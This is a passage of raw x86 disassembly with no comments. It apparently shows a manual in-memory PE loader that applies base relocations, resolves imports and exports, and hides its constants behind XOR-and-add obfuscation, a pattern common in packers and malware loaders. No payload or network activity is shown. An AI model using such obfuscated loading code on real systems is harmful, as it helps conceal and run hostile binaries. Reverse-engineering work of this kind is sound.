  4258d6:	mov    DWORD PTR [ebp-0x18],0xf89cb5b9
  4258dd:	mov    DWORD PTR [ebp-0x1c],0xf89c85f9
  4258e4:	mov    DWORD PTR [ebp-0x2c],0xf89c85bd
  4258eb:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4258f2:	mov    DWORD PTR [ebp-0x2c],0xf89f05b9
  4258f9:	mov    eax,DWORD PTR [ebp+0x20]
  4258fc:	mov    eax,DWORD PTR [eax+0x194]
  425902:	mov    DWORD PTR [ebp-0xc],eax
  425905:	mov    eax,DWORD PTR [ebp+0x20]
  425908:	push   ebx
  425909:	push   esi
  42590a:	mov    esi,DWORD PTR [eax+0x190]
  425910:	mov    eax,DWORD PTR [ebp+0x20]
  425913:	mov    eax,DWORD PTR [eax+0x18c]
  425919:	mov    DWORD PTR [ebp-0x8],eax
  42591c:	mov    eax,DWORD PTR [eax]
  42591e:	push   edi
  42591f:	mov    DWORD PTR [ebp-0x4],esi
  425922:	test   eax,eax
  425924:	jne    0x425931
  425926:	push   DWORD PTR [ebp+0x1c]
  425929:	mov    edx,DWORD PTR [ebp+0x20]
  42592c:	call   0x425870
  425931:	mov    eax,DWORD PTR [esi]
  425933:	mov    ebx,DWORD PTR [esi]
  425935:	add    ebx,DWORD PTR [eax+0x3c]
  425938:	mov    eax,DWORD PTR [ebp+0xc]
  42593b:	mov    ecx,DWORD PTR [ebp-0x8]
  42593e:	mov    ecx,DWORD PTR [ecx]
  425940:	mov    esi,0x75108b1
  425945:	xor    eax,esi
  425947:	mov    edi,0x3272f8
  42594c:	add    eax,edi
  42594e:	cmp    eax,ecx
  425950:	jne    0x425b88
  425956:	mov    eax,DWORD PTR [ebp-0xc]
  425959:	mov    eax,DWORD PTR [eax]
  42595b:	mov    DWORD PTR [ebp-0x10],eax
  42595e:	mov    eax,DWORD PTR [ebx+0x50]
  425961:	mov    DWORD PTR [ebp-0x68],eax
  425964:	mov    eax,DWORD PTR [ebp-0x18]
  425967:	xor    eax,esi
  425969:	add    eax,edi
  42596b:	mov    DWORD PTR [ebp-0x64],eax
  42596e:	mov    eax,DWORD PTR [ebp-0x14]
  425971:	and    DWORD PTR [ebp-0x6c],0x0
  425975:	xor    eax,esi
  425977:	add    eax,edi
  425979:	mov    DWORD PTR [ebp-0x60],eax
  42597c:	lea    eax,[ebp-0x70]
  42597f:	push   eax
  425980:	mov    eax,DWORD PTR [ebp+0x8]
  425983:	xor    eax,esi
  425985:	add    eax,edi
  425987:	push   eax
  425988:	mov    eax,DWORD PTR [ebp+0x20]
  42598b:	add    eax,0xaa
  425990:	push   eax
  425991:	mov    eax,DWORD PTR [ebp+0x20]
  425994:	mov    eax,DWORD PTR [eax+0x198]
  42599a:	mov    DWORD PTR [ebp-0x70],0x4
  4259a1:	push   DWORD PTR [eax]
  4259a3:	mov    eax,DWORD PTR [ebp+0x10]
  4259a6:	call   eax
  4259a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4259ab:	mov    ecx,DWORD PTR [ecx]
  4259ad:	mov    edx,DWORD PTR [ebp-0x8]
  4259b0:	mov    DWORD PTR [ebp-0x6c],eax
  4259b3:	mov    DWORD PTR [ebp+0x1c],eax
  4259b6:	mov    DWORD PTR [edx],ecx
  4259b8:	mov    ecx,DWORD PTR [ebp-0x4]
  4259bb:	mov    DWORD PTR [ecx],eax
  4259bd:	mov    eax,DWORD PTR [ebx+0x50]
  4259c0:	mov    DWORD PTR [ebp-0x68],eax
  4259c3:	mov    eax,DWORD PTR [ebp-0x1c]
  4259c6:	xor    eax,esi
  4259c8:	add    eax,edi
  4259ca:	mov    DWORD PTR [ebp-0x64],eax
  4259cd:	lea    eax,[ebp-0x20]
  4259d0:	mov    DWORD PTR [ebp-0x60],eax
  4259d3:	lea    eax,[ebp-0x70]
  4259d6:	push   eax
  4259d7:	mov    eax,DWORD PTR [ebp+0x8]
  4259da:	xor    eax,esi
  4259dc:	add    eax,edi
  4259de:	push   eax
  4259df:	mov    eax,DWORD PTR [ebp+0x20]
  4259e2:	add    eax,0xee
  4259e7:	push   eax
  4259e8:	mov    eax,DWORD PTR [ebp+0x20]
  4259eb:	mov    eax,DWORD PTR [eax+0x198]
  4259f1:	mov    DWORD PTR [ebp-0x70],0x4
  4259f8:	push   DWORD PTR [eax]
  4259fa:	mov    eax,DWORD PTR [ebp+0x10]
  4259fd:	call   eax
  4259ff:	test   eax,eax
  425a01:	je     0x425a26
  425a03:	and    DWORD PTR [ebp+0xc],0x0
  425a07:	cmp    DWORD PTR [ebx+0x50],0x0
  425a0b:	jbe    0x425a26
  425a0d:	mov    eax,DWORD PTR [ebp+0x1c]
  425a10:	mov    ecx,DWORD PTR [ebp-0x10]
  425a13:	sub    ecx,eax
  425a15:	mov    dl,BYTE PTR [ecx+eax*1]
  425a18:	inc    DWORD PTR [ebp+0xc]
  425a1b:	mov    BYTE PTR [eax],dl
  425a1d:	mov    edx,DWORD PTR [ebp+0xc]
  425a20:	inc    eax
  425a21:	cmp    edx,DWORD PTR [ebx+0x50]
  425a24:	jb     0x425a15
  425a26:	mov    edx,DWORD PTR [ebp+0x1c]
  425a29:	mov    ecx,DWORD PTR [edx+0x3c]
  425a2c:	add    ecx,edx
  425a2e:	mov    eax,DWORD PTR [ecx+0xa0]
  425a34:	mov    ebx,DWORD PTR [ecx+0x28]
  425a37:	add    eax,edx
  425a39:	sub    edx,DWORD PTR [ebp-0x10]
  425a3c:	add    ebx,DWORD PTR [ebp+0x1c]
  425a3f:	mov    DWORD PTR [ebp+0xc],edx
  425a42:	mov    DWORD PTR [ebp-0x2c],ecx
  425a45:	mov    DWORD PTR [ebp-0x14],ebx
  425a48:	mov    DWORD PTR [ebp-0x8],0x0
  425a4f:	jmp    0x425acb
  425a51:	add    edx,0xfffffff8
  425a54:	shr    edx,1
  425a56:	mov    DWORD PTR [ebp-0x18],edx
  425a59:	je     0x425ab7
  425a5b:	lea    edx,[eax+0x8]
  425a5e:	mov    DWORD PTR [ebp-0x4],edx
  425a61:	mov    edx,DWORD PTR [ebp-0x18]
  425a64:	mov    DWORD PTR [ebp-0x18],edx
  425a67:	mov    edx,DWORD PTR [ebp-0x4]
  425a6a:	movzx  edx,WORD PTR [edx]
  425a6d:	mov    DWORD PTR [ebp-0x24],edx
  425a70:	and    edx,0xfff
  425a76:	mov    DWORD PTR [ebp-0x28],edx
  425a79:	mov    edx,DWORD PTR [ebp-0x24]
  425a7c:	shr    edx,0xc
  425a7f:	add    edx,0xffcd8d08
  425a85:	xor    edx,esi
  425a87:	cmp    edx,0xf89c85ba
  425a8d:	jne    0x425aae
  425a8f:	mov    edx,DWORD PTR [ebp-0x28]
  425a92:	add    edx,DWORD PTR [ebp+0x1c]
  425a95:	mov    ebx,DWORD PTR [eax]
  425a97:	cmp    DWORD PTR [ebx+edx*1],0x0
  425a9b:	je     0x425aab
  425a9d:	mov    ecx,DWORD PTR [ebp+0xc]
  425aa0:	add    ecx,DWORD PTR [ebx+edx*1]
  425aa3:	mov    ebx,DWORD PTR [eax]
  425aa5:	mov    DWORD PTR [edx+ebx*1],ecx
  425aa8:	mov    ecx,DWORD PTR [ebp-0x2c]
  425aab:	mov    ebx,DWORD PTR [ebp-0x14]
  425aae:	add    DWORD PTR [ebp-0x4],0x2
  425ab2:	dec    DWORD PTR [ebp-0x18]
  425ab5:	jne    0x425a67
  425ab7:	mov    edx,DWORD PTR [ebp-0xc]
  425aba:	add    DWORD PTR [ebp-0x8],edx
  425abd:	mov    edx,DWORD PTR [ebp-0x8]
  425ac0:	cmp    edx,DWORD PTR [ecx+0xa4]
  425ac6:	jae    0x425ad9
  425ac8:	add    eax,DWORD PTR [ebp-0xc]
  425acb:	mov    edx,DWORD PTR [eax+0x4]
  425ace:	mov    DWORD PTR [ebp-0xc],edx
  425ad1:	test   edx,edx
  425ad3:	jne    0x425a51
  425ad9:	mov    eax,DWORD PTR [ebp-0x10]
  425adc:	mov    DWORD PTR [ebp-0x6c],eax
  425adf:	mov    DWORD PTR [ebp-0x70],0x4
  425ae6:	mov    eax,DWORD PTR [ecx+0x50]
  425ae9:	mov    DWORD PTR [ebp-0x68],eax
  425aec:	mov    eax,DWORD PTR [ebp-0x1c]
  425aef:	xor    eax,esi
  425af1:	add    eax,edi
  425af3:	mov    DWORD PTR [ebp-0x64],eax
  425af6:	lea    eax,[ebp-0x20]
  425af9:	mov    DWORD PTR [ebp-0x60],eax
  425afc:	lea    eax,[ebp-0x70]
  425aff:	push   eax
  425b00:	mov    eax,DWORD PTR [ebp+0x8]
  425b03:	xor    eax,esi
  425b05:	add    eax,edi
  425b07:	push   eax
  425b08:	mov    eax,DWORD PTR [ebp+0x20]
  425b0b:	add    eax,0xee
  425b10:	push   eax
  425b11:	mov    eax,DWORD PTR [ebp+0x20]
  425b14:	mov    eax,DWORD PTR [eax+0x198]
  425b1a:	push   DWORD PTR [eax]
  425b1c:	mov    eax,DWORD PTR [ebp+0x10]
  425b1f:	call   eax
  425b21:	mov    eax,DWORD PTR [ebp+0x20]
  425b24:	mov    eax,DWORD PTR [eax+0x180]
  425b2a:	add    eax,DWORD PTR [ebp+0xc]
  425b2d:	mov    ecx,DWORD PTR [ebp+0xc]
  425b30:	push   DWORD PTR [ebp+0x18]
  425b33:	mov    DWORD PTR [eax],ecx
  425b35:	push   DWORD PTR [ebp+0x14]
  425b38:	push   DWORD PTR [ebp+0x1c]
  425b3b:	call   ebx
  425b3d:	mov    ecx,DWORD PTR [ebp+0xc]
  425b40:	add    ecx,DWORD PTR [ebp+0x20]
  425b43:	lea    eax,[ebp+0x4]
  425b46:	mov    DWORD PTR [ebp+0x20],ecx
  425b49:	mov    ecx,DWORD PTR [ebp+0x20]
  425b4c:	mov    ecx,DWORD PTR [ebp+0x20]
  425b4f:	mov    edx,DWORD PTR [ecx+0x190]
  425b55:	mov    ecx,DWORD PTR [ebp+0x20]
  425b58:	mov    ecx,DWORD PTR [ecx+0x18c]
  425b5e:	mov    esi,DWORD PTR [ecx]
  425b60:	cmp    DWORD PTR [eax],esi
  425b62:	jb     0x425b83
  425b64:	mov    esi,DWORD PTR [edx]
  425b66:	mov    edi,DWORD PTR [edx]
  425b68:	mov    esi,DWORD PTR [esi+0x3c]
  425b6b:	lea    esi,[edi+esi*1+0x50]
  425b6f:	mov    edi,DWORD PTR [ecx]
  425b71:	add    edi,DWORD PTR [esi]
  425b73:	cmp    DWORD PTR [eax],edi
  425b75:	jae    0x425b83
  425b77:	mov    esi,DWORD PTR [ecx]
  425b79:	mov    ecx,DWORD PTR [eax]
  425b7b:	mov    edx,DWORD PTR [edx]
  425b7d:	sub    ecx,esi
  425b7f:	add    edx,ecx
  425b81:	mov    DWORD PTR [eax],edx
  425b83:	mov    eax,DWORD PTR [ebp+0xc]
  425b86:	jmp    0x425b8a
  425b88:	xor    eax,eax
  425b8a:	pop    edi
  425b8b:	pop    esi
  425b8c:	pop    ebx
  425b8d:	leave  
  425b8e:	ret    0x1c
  425b91:	push   ebp
  425b92:	mov    ebp,esp
  425b94:	sub    esp,0x1c
  425b97:	push   esi
  425b98:	mov    esi,eax
  425b9a:	mov    eax,DWORD PTR [ecx+0x190]
  425ba0:	cmp    DWORD PTR [eax],0x0
  425ba3:	je     0x425cb3
  425ba9:	test   edx,edx
  425bab:	je     0x425cb3
  425bb1:	test   esi,esi
  425bb3:	je     0x425cb3
  425bb9:	mov    eax,DWORD PTR [esi+0x88]
  425bbf:	test   eax,eax
  425bc1:	je     0x425cae
  425bc7:	cmp    DWORD PTR [esi+0x8c],0x10
  425bce:	je     0x425cae
  425bd4:	cmp    DWORD PTR [esi+0x34],edx
  425bd7:	je     0x425cae
  425bdd:	mov    esi,DWORD PTR [ecx+0x18c]
  425be3:	and    DWORD PTR [ebp-0x10],0x0
  425be7:	mov    ecx,edx
  425be9:	sub    ecx,DWORD PTR [esi]
  425beb:	add    eax,edx
  425bed:	movzx  edx,WORD PTR [eax+0xc]
  425bf1:	mov    DWORD PTR [ebp-0x1c],ecx
  425bf4:	movzx  ecx,WORD PTR [eax+0xe]
  425bf8:	add    ecx,edx
  425bfa:	je     0x425cae
  425c00:	lea    ecx,[eax+0x14]
  425c03:	push   ebx
  425c04:	mov    DWORD PTR [ebp-0x18],ecx
  425c07:	mov    esi,0x7fffffff
  425c0c:	push   edi
  425c0d:	test   DWORD PTR [ecx],esi
  425c0f:	je     0x425c90
  425c11:	mov    edx,DWORD PTR [ecx]
  425c13:	and    DWORD PTR [ebp-0xc],0x0
  425c17:	and    edx,esi
  425c19:	add    edx,eax
  425c1b:	movzx  edi,WORD PTR [edx+0xe]
  425c1f:	movzx  ebx,WORD PTR [edx+0xc]
  425c23:	add    edi,ebx
  425c25:	je     0x425c90
  425c27:	lea    ecx,[edx+0x14]
  425c2a:	mov    DWORD PTR [ebp-0x14],ecx
  425c2d:	test   DWORD PTR [ecx],esi
  425c2f:	je     0x425c72
  425c31:	mov    ecx,DWORD PTR [ecx]
  425c33:	and    DWORD PTR [ebp-0x8],0x0
  425c37:	and    ecx,esi
  425c39:	add    ecx,eax
  425c3b:	movzx  edi,WORD PTR [ecx+0xe]
  425c3f:	movzx  ebx,WORD PTR [ecx+0xc]
  425c43:	add    edi,ebx
  425c45:	je     0x425c72
  425c47:	lea    edi,[ecx+0x14]
  425c4a:	mov    DWORD PTR [ebp-0x4],edi
  425c4d:	mov    edi,DWORD PTR [ebp-0x4]
  425c50:	mov    edi,DWORD PTR [edi]
  425c52:	test   edi,edi
  425c54:	je     0x425c5c
  425c56:	mov    ebx,DWORD PTR [ebp-0x1c]
  425c59:	add    DWORD PTR [edi+eax*1],ebx
  425c5c:	movzx  edi,WORD PTR [ecx+0xe]
  425c60:	movzx  ebx,WORD PTR [ecx+0xc]
  425c64:	inc    DWORD PTR [ebp-0x8]
  425c67:	add    DWORD PTR [ebp-0x4],0x8
  425c6b:	add    edi,ebx
  425c6d:	cmp    DWORD PTR [ebp-0x8],edi
  425c70:	jb     0x425c4d
  425c72:	movzx  edi,WORD PTR [edx+0xe]
  425c76:	movzx  ebx,WORD PTR [edx+0xc]
  425c7a:	mov    ecx,DWORD PTR [ebp-0x14]
  425c7d:	inc    DWORD PTR [ebp-0xc]
  425c80:	add    ecx,0x8
  425c83:	add    edi,ebx
  425c85:	mov    DWORD PTR [ebp-0x14],ecx
  425c88:	cmp    DWORD PTR [ebp-0xc],edi
  425c8b:	jb     0x425c2d
  425c8d:	mov    ecx,DWORD PTR [ebp-0x18]
  425c90:	movzx  edx,WORD PTR [eax+0xe]
  425c94:	movzx  edi,WORD PTR [eax+0xc]
  425c98:	inc    DWORD PTR [ebp-0x10]
  425c9b:	add    ecx,0x8
  425c9e:	add    edx,edi
  425ca0:	mov    DWORD PTR [ebp-0x18],ecx
  425ca3:	cmp    DWORD PTR [ebp-0x10],edx
  425ca6:	jb     0x425c0d
  425cac:	pop    edi
  425cad:	pop    ebx
  425cae:	xor    eax,eax
  425cb0:	inc    eax
  425cb1:	jmp    0x425cb5
  425cb3:	xor    eax,eax
  425cb5:	pop    esi
  425cb6:	leave  
  425cb7:	ret    
  425cb8:	push   ebp
  425cb9:	mov    ebp,esp
  425cbb:	mov    ecx,DWORD PTR [ecx+0x190]
  425cc1:	mov    eax,DWORD PTR [ebp+0xc]
  425cc4:	sub    esp,0x10
  425cc7:	push   ebx
  425cc8:	xor    ebx,ebx
  425cca:	push   esi
  425ccb:	push   edi
  425ccc:	cmp    DWORD PTR [ecx],ebx
  425cce:	je     0x425d56
  425cd4:	cmp    eax,ebx
  425cd6:	je     0x425d56
  425cd8:	cmp    DWORD PTR [eax+0x78],ebx
  425cdb:	jne    0x425ce2
  425cdd:	xor    eax,eax
  425cdf:	inc    eax
  425ce0:	jmp    0x425d58
  425ce2:	mov    eax,DWORD PTR [eax+0x78]
  425ce5:	add    eax,DWORD PTR [ebp+0x8]
  425ce8:	mov    ecx,DWORD PTR [eax+0x1c]
  425ceb:	mov    edx,DWORD PTR [eax+0x24]
  425cee:	mov    esi,DWORD PTR [eax+0x14]
  425cf1:	mov    edi,DWORD PTR [eax+0x18]
  425cf4:	add    ecx,DWORD PTR [ebp+0x8]
  425cf7:	add    edx,DWORD PTR [ebp+0x8]
  425cfa:	mov    DWORD PTR [ebp-0x4],esi
  425cfd:	cmp    esi,edi
  425cff:	ja     0x425d04
  425d01:	mov    DWORD PTR [ebp-0x4],edi
  425d04:	mov    DWORD PTR [ebp-0x8],ebx
  425d07:	cmp    DWORD PTR [ebp-0x4],ebx
  425d0a:	jbe    0x425cdd
  425d0c:	cmp    ebx,DWORD PTR [eax+0x14]
  425d0f:	jae    0x425d17
  425d11:	movzx  esi,WORD PTR [edx+ebx*2]
  425d15:	jmp    0x425d19
  425d17:	mov    esi,ebx
  425d19:	lea    esi,[ecx+esi*4]
  425d1c:	mov    edi,DWORD PTR [esi]
  425d1e:	test   edi,edi
  425d20:	je     0x425d4b
  425d22:	add    edi,DWORD PTR [ebp+0x8]
  425d25:	mov    DWORD PTR [ebp-0x10],edi
  425d28:	cmp    edi,eax
  425d2a:	jbe    0x425d3c
  425d2c:	mov    ebx,DWORD PTR [ebp+0xc]
  425d2f:	mov    ebx,DWORD PTR [ebx+0x7c]
  425d32:	add    ebx,eax
  425d34:	cmp    edi,ebx
  425d36:	jae    0x425d3c
  425d38:	mov    esi,DWORD PTR [esi]
  425d3a:	jmp    0x425d44
  425d3c:	sub    edi,DWORD PTR [ebp+0x8]
  425d3f:	mov    DWORD PTR [esi],edi
  425d41:	mov    esi,DWORD PTR [ebp-0x10]
  425d44:	test   esi,esi
  425d46:	je     0x425d56
  425d48:	mov    ebx,DWORD PTR [ebp-0x8]
  425d4b:	inc    ebx
  425d4c:	mov    DWORD PTR [ebp-0x8],ebx
  425d4f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425d52:	jb     0x425d0c
  425d54:	jmp    0x425cdd
  425d56:	xor    eax,eax
  425d58:	pop    edi
  425d59:	pop    esi
  425d5a:	pop    ebx
  425d5b:	leave  
  425d5c:	ret    0x8
  425d5f:	push   ebp
  425d60:	mov    ebp,esp
  425d62:	sub    esp,0x2c
  425d65:	mov    edx,0xf89c85b9
  425d6a:	mov    DWORD PTR [ebp-0x4],edx
  425d6d:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  425d74:	mov    eax,DWORD PTR [ebp-0x4]
  425d77:	mov    ecx,DWORD PTR [ebp-0x4]
  425d7a:	mov    ecx,DWORD PTR [ebp-0x4]
  425d7d:	mov    ecx,DWORD PTR [ebp-0x4]
  425d80:	mov    ecx,DWORD PTR [ebp-0x4]
  425d83:	mov    ecx,DWORD PTR [ebp-0x4]
  425d86:	push   ebx
  425d87:	mov    ebx,DWORD PTR [ebp+0x10]
  425d8a:	push   esi
  425d8b:	mov    esi,0x75108b1
  425d90:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  425d97:	mov    ecx,DWORD PTR [ebp-0x4]
  425d9a:	mov    ebx,DWORD PTR [ebx+0x190]
  425da0:	push   edi
  425da1:	mov    edi,0x3272f8
  425da6:	xor    ecx,esi
  425da8:	xor    eax,esi
  425daa:	add    eax,edi
  425dac:	add    ecx,edi
  425dae:	mov    DWORD PTR [ebp-0x18],eax
  425db1:	cmp    ecx,DWORD PTR [ebx]
  425db3:	je     0x426034
  425db9:	mov    ebx,DWORD PTR [ebp-0x4]
  425dbc:	mov    ecx,DWORD PTR [ebp+0xc]
  425dbf:	xor    ebx,esi
  425dc1:	add    ebx,edi
  425dc3:	cmp    ebx,ecx
  425dc5:	je     0x426034
  425dcb:	mov    ebx,DWORD PTR [ebp-0x4]
  425dce:	mov    ecx,DWORD PTR [ecx+0x80]
  425dd4:	xor    ebx,esi
  425dd6:	add    ebx,edi
  425dd8:	cmp    ecx,ebx
  425dda:	je     0x42602f
  425de0:	add    ecx,DWORD PTR [ebp+0x8]
  425de3:	mov    DWORD PTR [ebp-0x2c],ecx
  425de6:	mov    ebx,edx
  425de8:	xor    ebx,esi
  425dea:	add    ebx,edi
  425dec:	mov    DWORD PTR [ebp-0x10],ebx
  425def:	mov    ebx,DWORD PTR [ebp-0x10]
  425df2:	cmp    ebx,edx
  425df4:	je     0x425e08
  425df6:	mov    edx,DWORD PTR [ebp-0x10]
  425df9:	mov    ebx,DWORD PTR [ebp-0x4]
  425dfc:	imul   edx,edx,0x14
  425dff:	xor    ebx,esi
  425e01:	add    ebx,edi
  425e03:	cmp    DWORD PTR [edx+ecx*1],ebx
  425e06:	jne    0x425e1f
  425e08:	mov    edx,DWORD PTR [ebp-0x10]
  425e0b:	mov    ebx,DWORD PTR [ebp-0x4]
  425e0e:	imul   edx,edx,0x14
  425e11:	xor    ebx,esi
  425e13:	add    ebx,edi
  425e15:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425e19:	je     0x426021
  425e1f:	mov    eax,DWORD PTR [ebp-0x4]
  425e22:	mov    ebx,DWORD PTR [ebp-0x4]
  425e25:	mov    eax,DWORD PTR [ebp-0x10]
  425e28:	imul   eax,eax,0x14
  425e2b:	add    eax,ecx
  425e2d:	mov    ecx,DWORD PTR [eax+0x10]
  425e30:	add    ecx,DWORD PTR [ebp+0x8]
  425e33:	xor    ebx,esi
  425e35:	mov    DWORD PTR [ebp-0x1c],ecx
  425e38:	mov    ecx,DWORD PTR [ebp-0x4]
  425e3b:	mov    edx,DWORD PTR [ebp-0x4]
  425e3e:	xor    ecx,esi
  425e40:	add    ecx,edi
  425e42:	xor    edx,esi
  425e44:	mov    DWORD PTR [ebp-0x24],ecx
  425e47:	mov    ecx,DWORD PTR [eax]
  425e49:	add    edx,edi
  425e4b:	add    ebx,edi
  425e4d:	cmp    ecx,edx
  425e4f:	je     0x425e57
  425e51:	add    ecx,DWORD PTR [ebp+0x8]
  425e54:	mov    DWORD PTR [ebp-0x24],ecx
  425e57:	mov    ecx,DWORD PTR [ebp-0x4]
  425e5a:	xor    ecx,esi
  425e5c:	add    ecx,DWORD PTR [eax+0xc]
  425e5f:	mov    eax,DWORD PTR [ebp+0x8]
  425e62:	lea    eax,[ecx+eax*1+0x3272f8]
  425e69:	mov    DWORD PTR [ebp+0xc],eax
  425e6c:	mov    DWORD PTR [ebp-0x28],0xf89c85bc
  425e73:	mov    eax,DWORD PTR [ebp+0x10]
  425e76:	push   DWORD PTR [ebp+0xc]
  425e79:	mov    eax,DWORD PTR [eax+0x1e0]
  425e7f:	call   DWORD PTR [eax]
  425e81:	mov    ecx,DWORD PTR [ebp-0x4]
  425e84:	xor    ecx,esi
  425e86:	add    ecx,edi
  425e88:	mov    DWORD PTR [ebp-0xc],eax
  425e8b:	cmp    ecx,eax
  425e8d:	jne    0x425ea1
  425e8f:	mov    eax,DWORD PTR [ebp+0x10]
  425e92:	push   DWORD PTR [ebp+0xc]
  425e95:	mov    eax,DWORD PTR [eax+0x1e0]
  425e9b:	call   DWORD PTR [eax+0xc]
  425e9e:	mov    DWORD PTR [ebp-0xc],eax
  425ea1:	mov    DWORD PTR [ebp-0x20],0x7f661b30
  425ea8:	mov    DWORD PTR [ebp-0x20],0xf89c9840
  425eaf:	mov    eax,DWORD PTR [ebp-0x4]
  425eb2:	xor    eax,esi
  425eb4:	add    eax,edi
  425eb6:	cmp    eax,DWORD PTR [ebp-0xc]
  425eb9:	jne    0x425ede
  425ebb:	mov    eax,DWORD PTR [ebp-0x8]
  425ebe:	mov    ecx,DWORD PTR [ebp-0x20]
  425ec1:	xor    eax,esi
  425ec3:	xor    ecx,esi
  425ec5:	lea    ebx,[ebx+eax*1+0x3272f8]
  425ecc:	mov    eax,DWORD PTR [ebp+0x10]
  425ecf:	mov    eax,DWORD PTR [eax+0x1e0]
  425ed5:	add    ecx,edi
  425ed7:	imul   ecx,ebx
  425eda:	push   ecx
  425edb:	call   DWORD PTR [eax+0x24]
  425ede:	mov    eax,DWORD PTR [ebp-0x4]
  425ee1:	xor    eax,esi
  425ee3:	add    eax,edi
  425ee5:	cmp    eax,DWORD PTR [ebp-0xc]
  425ee8:	jne    0x425ef9
  425eea:	mov    eax,DWORD PTR [ebp-0x28]
  425eed:	xor    eax,esi
  425eef:	add    eax,edi
  425ef1:	cmp    ebx,eax
  425ef3:	jbe    0x425e73
  425ef9:	mov    eax,DWORD PTR [ebp-0x4]
  425efc:	xor    eax,esi
  425efe:	add    eax,edi
  425f00:	cmp    eax,DWORD PTR [ebp-0xc]
  425f03:	jne    0x425f1c
  425f05:	mov    eax,DWORD PTR [ebp-0x8]
  425f08:	mov    ecx,DWORD PTR [ebp-0x18]
  425f0b:	xor    eax,esi
  425f0d:	lea    eax,[ecx+eax*1+0x3272f8]
  425f14:	mov    DWORD PTR [ebp-0x18],eax
  425f17:	jmp    0x42600b
  425f1c:	mov    DWORD PTR [ebp-0x14],0x1121b31
  425f23:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  425f2a:	mov    ebx,DWORD PTR [ebp-0x4]
  425f2d:	xor    ebx,esi
  425f2f:	add    ebx,edi
  425f31:	jmp    0x425ff8
  425f36:	mov    eax,DWORD PTR [ebp-0x4]
  425f39:	xor    eax,esi
  425f3b:	add    eax,edi
  425f3d:	mov    DWORD PTR [ebp-0x14],eax
  425f40:	mov    eax,DWORD PTR [ebp-0x4]
  425f43:	xor    eax,esi
  425f45:	add    eax,edi
  425f47:	mov    DWORD PTR [ebp+0xc],eax
  425f4a:	mov    ecx,DWORD PTR [ebp-0x4]
  425f4d:	mov    eax,DWORD PTR [ebp-0x24]
  425f50:	xor    ecx,esi
  425f52:	add    ecx,edi
  425f54:	cmp    ecx,eax
  425f56:	je     0x425f5e
  425f58:	mov    eax,DWORD PTR [eax+ebx*4]
  425f5b:	mov    DWORD PTR [ebp-0x14],eax
  425f5e:	mov    eax,DWORD PTR [ebp-0x1c]
  425f61:	mov    eax,DWORD PTR [eax+ebx*4]
  425f64:	mov    DWORD PTR [ebp+0xc],eax
  425f67:	mov    eax,DWORD PTR [ebp-0x4]
  425f6a:	mov    ecx,DWORD PTR [ebp-0x14]
  425f6d:	xor    eax,esi
  425f6f:	add    eax,edi
  425f71:	cmp    eax,ecx
  425f73:	je     0x425f9e
  425f75:	mov    eax,DWORD PTR [ebp-0x4]
  425f78:	mov    ecx,DWORD PTR [ebp-0x14]
  425f7b:	xor    eax,esi
  425f7d:	add    eax,edi
  425f7f:	shr    ecx,0x1f
  425f82:	cmp    eax,ecx
  425f84:	je     0x425f9e
  425f86:	mov    ecx,DWORD PTR [ebp-0x14]
  425f89:	mov    eax,DWORD PTR [ebp+0x10]
  425f8c:	mov    eax,DWORD PTR [eax+0x1e0]
  425f92:	movzx  ecx,cx
  425f95:	push   ecx
  425f96:	push   DWORD PTR [ebp-0xc]
  425f99:	call   DWORD PTR [eax+0x8]
  425f9c:	jmp    0x425fb7
  425f9e:	mov    eax,DWORD PTR [ebp+0xc]
  425fa1:	add    eax,DWORD PTR [ebp+0x8]
  425fa4:	mov    ecx,DWORD PTR [ebp+0x10]
  425fa7:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425fad:	add    eax,0x2
  425fb0:	push   eax
  425fb1:	push   DWORD PTR [ebp-0xc]
  425fb4:	call   DWORD PTR [ecx+0x8]
  425fb7:	mov    DWORD PTR [ebp+0xc],eax
  425fba:	mov    eax,DWORD PTR [ebp-0x4]
  425fbd:	mov    ecx,DWORD PTR [ebp+0xc]
  425fc0:	xor    eax,esi
  425fc2:	add    eax,edi
  425fc4:	cmp    eax,ecx
  425fc6:	mov    eax,DWORD PTR [ebp-0x8]
  425fc9:	jne    0x425fdc
  425fcb:	mov    ecx,DWORD PTR [ebp-0x18]
  425fce:	xor    eax,esi
  425fd0:	lea    eax,[ecx+eax*1+0x3272f8]
  425fd7:	mov    DWORD PTR [ebp-0x18],eax
  425fda:	jmp    0x425fec
  425fdc:	mov    ecx,DWORD PTR [ebp+0xc]
  425fdf:	xor    eax,esi
  425fe1:	add    eax,edi
  425fe3:	imul   eax,ecx
  425fe6:	mov    ecx,DWORD PTR [ebp-0x1c]
  425fe9:	mov    DWORD PTR [ecx+ebx*4],eax
  425fec:	mov    eax,DWORD PTR [ebp-0x8]
  425fef:	xor    eax,esi
  425ff1:	lea    ebx,[ebx+eax*1+0x3272f8]
  425ff8:	mov    eax,DWORD PTR [ebp-0x4]
  425ffb:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ffe:	xor    eax,esi
  426000:	add    eax,edi
  426002:	cmp    DWORD PTR [ecx+ebx*4],eax
  426005:	jne    0x425f36
  42600b:	mov    edx,DWORD PTR [ebp-0x10]
  42600e:	mov    eax,DWORD PTR [ebp-0x18]
  426011:	mov    ecx,DWORD PTR [ebp-0x2c]
  426014:	sub    edx,0x3272f7
  42601a:	xor    edx,esi
  42601c:	jmp    0x425de6
  426021:	mov    ecx,DWORD PTR [ebp-0x4]
  426024:	xor    ecx,esi
  426026:	add    ecx,edi
  426028:	cmp    eax,ecx
  42602a:	mov    eax,DWORD PTR [ebp-0x4]
  42602d:	jne    0x426037
  42602f:	mov    eax,DWORD PTR [ebp-0x8]
  426032:	jmp    0x426037
  426034:	mov    eax,DWORD PTR [ebp-0x4]
  426037:	xor    eax,esi
  426039:	add    eax,edi
  42603b:	pop    edi
  42603c:	pop    esi
  42603d:	pop    ebx
  42603e:	leave  
  42603f:	ret    0xc
  426042:	push   ebp
  426043:	mov    ebp,esp
  426045:	sub    esp,0x28
  426048:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  42604f:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  426056:	mov    eax,DWORD PTR [ebp+0xc]
  426059:	mov    DWORD PTR [ebp+0xc],eax
  42605c:	push   esi
  42605d:	mov    eax,eax
